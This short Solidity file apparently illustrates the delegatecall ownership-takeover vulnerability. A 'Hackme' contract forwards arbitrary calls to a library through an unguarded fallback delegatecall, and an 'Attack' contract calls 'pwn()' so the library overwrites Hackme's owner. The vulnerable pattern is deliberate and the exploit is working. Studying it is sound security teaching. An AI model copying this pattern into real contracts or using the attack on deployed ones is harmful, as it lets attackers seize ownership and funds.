// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;


contract Hackme {

    address public owner;
    Lib public lib;

    constructor(Lib _lib) public {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable{
        address(lib).delegatecall(msg.data);
    }
}

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) public {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()")); // This calls the fallback function since pwn() is not a function in the hackme contract
    }
}